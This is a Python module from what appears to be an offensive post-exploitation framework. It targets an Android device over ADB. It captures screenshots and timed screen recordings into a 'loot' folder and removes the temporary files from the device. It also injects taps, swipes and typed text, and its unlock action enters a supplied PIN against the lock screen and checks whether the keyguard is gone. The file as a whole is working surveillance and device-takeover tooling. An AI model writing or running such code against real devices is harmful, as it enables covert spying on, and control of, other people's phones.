import subprocess
import time
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()

def _adb(device_id, *args):
    cmd = ['adb', '-s', device_id] + list(args)
    r = subprocess.run(cmd, capture_output=True, text=True)
    return r.stdout.strip(), r.stderr.strip()

def _shell(device_id, cmd):
    out, _ = _adb(device_id, 'shell', cmd)
    return out

class Module:
    MODULE_INFO = {
        'name': 'post/android_screen',
        'description': 'Live Android screen capture, screencast, and UI interaction (tap, swipe, type) via ADB.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'ACTION': 'Action to perform: screenshot, screencast, tap, swipe, type, unlock [default: screenshot]',
            'OUTPUT': 'Output file for screenshot/screencast [default: loot/android_screen.<ext>]',
            'DURATION': 'Screencast duration in seconds [default: 10]',
            'X': 'X coordinate for tap/swipe start',
            'Y': 'Y coordinate for tap/swipe start',
            'X2': 'X2 coordinate for swipe end',
            'Y2': 'Y2 coordinate for swipe end',
            'TEXT': 'Text to type on device',
            'PIN': 'PIN to try for unlock (0000-9999)',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _screenshot(self, dev, output):
        Path(output).parent.mkdir(parents=True, exist_ok=True)
        console.print(f"[cyan][*] Capturing screenshot...[/cyan]")
        _adb(dev, 'shell', 'screencap', '-p', '/sdcard/shadow_cap.png')
        time.sleep(0.5)
        out, err = _adb(dev, 'pull', '/sdcard/shadow_cap.png', output)
        _adb(dev, 'shell', 'rm', '/sdcard/shadow_cap.png')
        if not err or 'pulled' in out or '1 file' in out:
            size = Path(output).stat().st_size if Path(output).exists() else 0
            console.print(f"[bold green][+] Screenshot saved: {output} ({size} bytes)[/bold green]")
            log_action(f"Android screenshot: {dev} → {output}")
        else:
            console.print(f"[red][!] Screenshot failed: {err}[/red]")

    def _screencast(self, dev, output, duration):
        Path(output).parent.mkdir(parents=True, exist_ok=True)
        remote = '/sdcard/shadow_screen.mp4'
        console.print(f"[cyan][*] Recording {duration}s screencast...[/cyan]")
        _adb(dev, 'shell', 'screenrecord', f'--time-limit={duration}', remote)
        time.sleep(duration + 1)
        out, err = _adb(dev, 'pull', remote, output)
        _adb(dev, 'shell', 'rm', remote)
        console.print(f"[bold green][+] Screencast saved: {output}[/bold green]")
        log_action(f"Android screencast: {dev} {duration}s → {output}")

    def _tap(self, dev, x, y):
        console.print(f"[cyan][*] Tapping ({x}, {y})...[/cyan]")
        _adb(dev, 'shell', 'input', 'tap', str(x), str(y))
        log_action(f"Android tap: {dev} ({x},{y})")

    def _swipe(self, dev, x1, y1, x2, y2):
        console.print(f"[cyan][*] Swiping ({x1},{y1}) → ({x2},{y2})...[/cyan]")
        _adb(dev, 'shell', 'input', 'swipe', str(x1), str(y1), str(x2), str(y2))
        log_action(f"Android swipe: {dev}")

    def _type_text(self, dev, text):
        console.print(f"[cyan][*] Typing: {text}[/cyan]")
        # Escape special chars for shell
        escaped = text.replace(' ', '%s').replace("'", "\\'").replace('"', '\\"')
        _adb(dev, 'shell', 'input', 'text', escaped)
        log_action(f"Android text input on {dev}")

    def _unlock(self, dev, pin):
        console.print(f"[cyan][*] Attempting unlock with PIN: {pin}...[/cyan]")
        # Wake screen
        _adb(dev, 'shell', 'input', 'keyevent', 'KEYCODE_WAKEUP')
        time.sleep(0.5)
        # Swipe up to open keypad
        _adb(dev, 'shell', 'input', 'swipe', '540', '1600', '540', '900')
        time.sleep(0.5)
        # Type PIN
        _adb(dev, 'shell', 'input', 'text', pin)
        time.sleep(0.3)
        _adb(dev, 'shell', 'input', 'keyevent', 'KEYCODE_ENTER')
        # Screenshot to verify
        time.sleep(1)
        result = _shell(dev, 'dumpsys window | grep mCurrentFocus')
        console.print(f"  Current focus: {result}")
        if 'Keyguard' not in result and 'keyguard' not in result.lower():
            console.print("[bold green][+] Device appears unlocked![/bold green]")
            log_action(f"Android unlock SUCCESS with PIN {pin} on {dev}")
        else:
            console.print("[yellow][!] Still locked or PIN incorrect.[/yellow]")

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        action = self.framework.options.get('ACTION', 'screenshot').lower()
        output = self.framework.options.get('OUTPUT', '')
        duration = int(self.framework.options.get('DURATION', 10))
        x = self.framework.options.get('X', '540')
        y = self.framework.options.get('Y', '960')
        x2 = self.framework.options.get('X2', '540')
        y2 = self.framework.options.get('Y2', '500')
        text = self.framework.options.get('TEXT', '')
        pin = self.framework.options.get('PIN', '')

        if not device_id:
            console.print("[red][!] DEVICE_ID is required.[/red]")
            return

        if action == 'screenshot':
            out = output or 'loot/android_screenshot.png'
            self._screenshot(device_id, out)
        elif action == 'screencast':
            out = output or 'loot/android_screencast.mp4'
            self._screencast(device_id, out, duration)
        elif action == 'tap':
            self._tap(device_id, x, y)
        elif action == 'swipe':
            self._swipe(device_id, x, y, x2, y2)
        elif action == 'type':
            if not text:
                console.print("[red][!] TEXT is required for type action.[/red]")
                return
            self._type_text(device_id, text)
        elif action == 'unlock':
            if not pin:
                console.print("[red][!] PIN is required for unlock action.[/red]")
                return
            self._unlock(device_id, pin)
        else:
            console.print(f"[red][!] Unknown action: {action}. Use: screenshot, screencast, tap, swipe, type, unlock[/red]")
